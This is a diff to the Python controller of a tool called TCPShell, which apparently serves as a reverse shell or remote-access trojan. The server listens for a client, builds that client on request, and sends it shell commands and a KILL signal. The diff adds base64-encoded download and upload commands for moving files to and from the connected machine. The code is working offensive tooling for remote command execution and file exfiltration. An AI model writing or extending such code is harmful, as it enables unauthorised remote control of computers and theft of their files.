@@ -6,7 +6,7 @@ This is the main file and starting point of the program.
 '''
 
 __author__ = 'lorem.cookie'
-__version__ = '0.2/alpha'
+__version__ = '0.3/alpha'
 
 __banner__ = '''\n
 --------------------------------------------------------------------------------------------------------------------
@@ -28,10 +28,12 @@ __banner__ = '''\n
 #Native Libs
 import socket
 import argparse
+import json
 
 #Not native Libs
 import subprocess
 import colorama
+import base64
 
 #Custome Libs
 from simple_logging import logging
@@ -90,6 +92,38 @@ class TCPShell:
         
             debug_log.DEBUG('Class input Values; HOST : {}, PORT : {}'.format(self.HOST, self.PORT))
         
+    def json_send(self, data):
+        
+        json_dump = json.dumps(data.decode())
+        
+        if debug:
+            
+            debug_log.DEBUG('Send Json_dump : {}'.format(json_dump))
+        
+        json_dump = json_dump.encode()
+        self.conn.send(json_dump)
+    
+    def json_recv(self):
+    
+        data = ''
+        
+        while True:
+            
+            try:
+                
+                data = data + self.conn.recv(1024).decode()
+                data = json.loads(data)
+                
+                if debug:
+                    
+                    debug_log.DEBUG('Recv Json_dump : {}'.format(data))
+                
+                return data.encode()
+            
+            except ValueError:
+                
+                continue
+    
     def bind_shell(self):
         '''
         Create and bind socket
@@ -99,16 +133,15 @@ class TCPShell:
             
             #Creating and binding socket
             self.s = socket.socket()
-            #FIXME : self.s.bind((self.HOST, self.PORT)) TypeError: str, bytes or bytearray expected, not int
             self.s.bind((self.HOST, self.PORT)) #Bind HOST and PORT to socket
             self.s.listen(1) #Listening for one connection
             
             self.logger.INFO('TCP Server serving on Port {}'.format(self.PORT))
-            
+                        
             if color:
-            
+                
                 print('\n{}[INFO]SERVING ON PORT {}{}'.format(GREEN, self.PORT, RESET))
-                print('{}--------------------------------------{}'.format(GREEN, RESET))
+                print('--------------------------------------')
             
             else:
                 
@@ -120,9 +153,9 @@ class TCPShell:
             self.logger.INFO('Connection from {}'.format(self.addr))
             
             if color:
-            
+                
                 print('\n{}[INFO]CONNECTION FROM {}{}'.format(GREEN, self.addr, RESET))
-                print('{}--------------------------------------{}'.format(GREEN, RESET))
+                print('--------------------------------------')
 
             else:
                 
@@ -162,11 +195,11 @@ class TCPShell:
             
             if debug:
             
-                debug_log.DEBUG('Command : {}'.format(command))
+                debug_log.DEBUG('Input Command : {}'.format(command))
                     
-            if(command == ''):
+            if(command == None):
                 
-                self.conn.send('clear'.encode())
+                self.json_send('clearstr'.encode())
                 
             elif(command == 'KILL'):
                 
@@ -179,14 +212,34 @@ class TCPShell:
                     print('\n[WARNING]KILLING SHELL')
                     
                 self.logger.WARNING('KILL COMMAND SEND KILLING SHELL')
-                self.conn.send('KILL'.encode())
+                self.json_send('KILL'.encode())
                 self.conn.close()
                 raise SystemExit
             
+            elif(command[:8] == 'download'):
+                
+                self.json_send(command.encode())
+                
+                with open(command[9:], 'wb') as f:
+                    
+                    content = self.json_recv()
+                    debug_log.DEBUG('Download base 64 data : {}'.format(content))
+                    f.write(base64.b64decode(content))
+            
+            elif(command[:6] == 'upload'):
+                
+                self.json_send(command.encode())
+                
+                with open(command[7:], 'rb') as f:
+                    
+                    content = f.read()
+                    debug_log.DEBUG('Upload base 64 data : {}'.format(content))
+                    self.json_send(base64.b64encode(content))
+            
             else:
                 
-                self.conn.send(command.encode()) #Send command
-                print(self.conn.recv(1024).decode()) #Recv client feedback
+                self.json_send(command.encode()) #Send command
+                print(self.json_recv().decode()) #Recv client feedback
             
 def main():
     
@@ -217,9 +270,9 @@ def main():
     if BUILD_IF: #Check if BUILD argument has benn used
         
         Build(HOST, PORT, Debug=True) #Call Build function for building client
-
+        
     shell = TCPShell(HOST, PORT) #Call TCPSERVER class for TCP handeling
-    shell.bind_shell() #Call function to call shell
+    shell.bind_shell() #Binding shell
     shell.shell_loop() #Enter Shell loop
     
 if __name__ == '__main__':
